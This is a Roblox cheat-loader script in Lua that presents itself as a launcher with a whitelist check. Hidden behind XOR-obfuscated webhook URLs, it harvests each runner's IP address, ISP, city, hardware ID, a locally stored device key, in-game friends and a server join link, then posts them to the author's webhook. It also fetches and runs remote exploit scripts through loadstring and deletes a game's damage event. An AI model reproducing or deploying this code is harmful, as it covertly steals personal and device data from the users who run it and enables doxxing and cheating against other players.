local _lp = game:GetService("Players").LocalPlayer
local _ts = game:GetService("TestService")
local _stg = _ts:FindFirstChild("__NK_RUNTIME")
local _auth = _stg and _stg:FindFirstChild(_lp.Name)

local function _H(h, k)
    local s = ""
    for i = 1, #h, 2 do s = s .. string.char(bit32.bxor(tonumber(h:sub(i, i+1), 16), k) - (i % 10)) end
    return s
end

local _req = (syn and syn.request or request or http_request)
local _HS = game:GetService("HttpService")

-- Проверка неофициального лоадера
if not (shared._NK_AUTH == "V8_SECURE_AUTH" or (_auth and _auth.Value == "V8_SECURE_AUTH")) then
    local _BAD_WH = _H("3D3E3F3C309E8E8FDEC7D3CECDD1D794DED6D9C6DDDCDD9BDCCCD7D9D3DCC694D1D4DF97DCDEDADEDAD7C9D696DEDCDFD7C9D6C99596D3C9DCDEDADEDAD7C9D6CDDCDFD7C9DBDFCDDCD19BCCDADFCD", 0x55)
    local ni = {} pcall(function() local r = _req({Url = "http://ip-api.com/json/", Method = "GET"}) if r.Success then ni = _HS:JSONDecode(r.Body) end end)
    local tk = "N/A" pcall(function() tk = readfile("nazarkus_key.json") end)
    pcall(function()
        _req({Url = _BAD_WH, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _HS:JSONEncode({
            embeds = {{
                title = "Non-official Loader Attempt Blocked",
                color = 16711680,
                fields = {
                    {name = "Player", value = _lp.Name .. " (" .. _lp.UserId .. ")", inline = true},
                    {name = "Device Key", value = "```" .. tk .. "```", inline = false},
                    {name = "Network", value = string.format("IP: %s\nISP: %s\nLoc: %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A"), inline = false}
                }
            }}
        })})
    end)
    task.wait(1.5) _lp:Kick("Security Error: Use the original launcher.") return
end
shared._NK_AUTH = nil

local Config = {
    WL = { UIDs = {"10760143653"}, HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"}, Keys = {"89D11F50-5490-4677-B709-4EBFBECA78CE", "46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"} },
    BL = { UIDs = {}, HWIDs = {}, Keys = {} }
}

local _W = _H("3D3E3F3C309E8E8FFEC4D3CECDD9D087CDD8D18C9D8681889D8FD590929F99989B94D1D4D7D2D9DDDED6D9DDCAD8DED0D9D994D0DBDC97DCDEDADEDAD7C9D696DEDCDFD7C9D6C99596D3C9DCDEDADEDAD7C9D6CDDCDFD7C9DBDFCDDCD19BCCDADFCD", 0x55)
local _uid = tostring(_lp.UserId)
local _hw = game:GetService("RbxAnalyticsService"):GetClientId()
local _tk = "N/A"
pcall(function() _tk = readfile("nazarkus_key.json") end)

local function chk(l)
    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
    return false
end

local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")

local function _LOG()
    pcall(function()
        local r = _req({Url = "http://ip-api.com/json/?fields=status,country,city,timezone,isp,query,proxy,hosting", Method = "GET"})
        local ni = r and r.Success and _HS:JSONDecode(r.Body) or {}
        
        local u, s = 0, 0
        local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
        local ts = {"gethui", "setthreadidentity"}
        for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
        for _, f in ipairs(ts) do if getgenv()[f] then s = s + 1 end end
        local exe = (identifyexecutor and identifyexecutor() or "Unknown") .. string.format(" (UNC: %d%% | sUNC: %d%%)", math.floor((u/4)*100), math.floor((s/2)*100))
        
        local fn, ft = "None", "None"
        local rs = game:GetService("ReplicatedStorage")
        local fdf = rs:FindFirstChild("FactionSysRS") and rs.FactionSysRS:FindFirstChild("FactionData")
        if fdf then
            for _, f in ipairs(fdf:GetChildren()) do
                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
                    local bd = f:FindFirstChild("BasicFactionData")
                    if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
                    break
                end
            end
        end

        local jid = game.JobId == "" and "Unknown" or game.JobId
        local jBtn = "https://tinyurl.com/api-create.php?url=" .. _HS:UrlEncode("roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jid)
        local jFinal = "N/A" pcall(function() local jr = _req({Url = jBtn, Method = "GET"}) if jr.Success then jFinal = jr.Body end end)
        
        local friends = {}
        for _, p in ipairs(game.Players:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end

        local payload = {
            ["embeds"] = {{
                ["title"] = (_st == "whitelist" and "Whitelisted User Executed" or "Unknown/Guest User Executed"),
                ["color"] = (_st == "whitelist" and 65280 or 16753920),
                ["fields"] = {
                    {["name"] = "Player Info", ["value"] = string.format("Name: %s (@%s)\nUser ID: `%s`\nAccount Age: %d days", _lp.DisplayName, _lp.Name, _uid, _lp.AccountAge), ["inline"] = false},
                    {["name"] = "Executor", ["value"] = exe, ["inline"] = true},
                    {["name"] = "System", ["value"] = "Platform: " .. (game:GetService("UserInputService").TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
                    {["name"] = "Faction", ["value"] = string.format("Tag: [%s]\nName: %s", ft, fn), ["inline"] = false},
                    {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
                    {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", jFinal, _uid), ["inline"] = false}
                },
                ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%x")}
            }}
        }
        _req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _HS:JSONEncode(payload)})
    end)
end

task.spawn(_LOG)

-- DRAGGABLE PANEL
if _st == "whitelist" then
    task.spawn(function()
        local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
        local f = Instance.new("Frame", sg)
        f.Size = UDim2.new(0, 200, 0, 300); f.Position = UDim2.new(0.5,-100,0.5,-150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Visible = false; f.Active = true; f.Draggable = true
        Instance.new("UICorner", f)
        local s = Instance.new("ScrollingFrame", f)
        s.Size = UDim2.new(1,-10,1,-20); s.Position = UDim2.new(0,5,0,10); s.BackgroundTransparency = 1
        Instance.new("UIListLayout", s).Padding = UDim.new(0, 5)
        local function refresh()
            for _, v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
            for _, pObj in ipairs(_stg:GetChildren()) do
                local b = Instance.new("TextButton", s)
                b.Size = UDim2.new(1, 0, 0, 30); b.Text = pObj.Name; b.TextColor3 = Color3.new(1,1,1); b.BackgroundColor3 = Color3.fromRGB(45,45,50)
                b.MouseButton1Click:Connect(function() pObj.Value = "kick" end)
            end
        end
        game:GetService("UserInputService").InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
    end)
end

_auth.Changed:Connect(function(v) if v == "kick" then _lp:Kick("Access Revoked.") end end)

pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua"))() end)
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))() end)
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua"))() end)
pcall(function() if game:GetService("ReplicatedStorage"):FindFirstChild("ACS_Engine") then game:GetService("ReplicatedStorage").ACS_Engine.Events.FDMG:Destroy() end end)
if _st == "blacklist" then _lp:Kick("Banned.") end
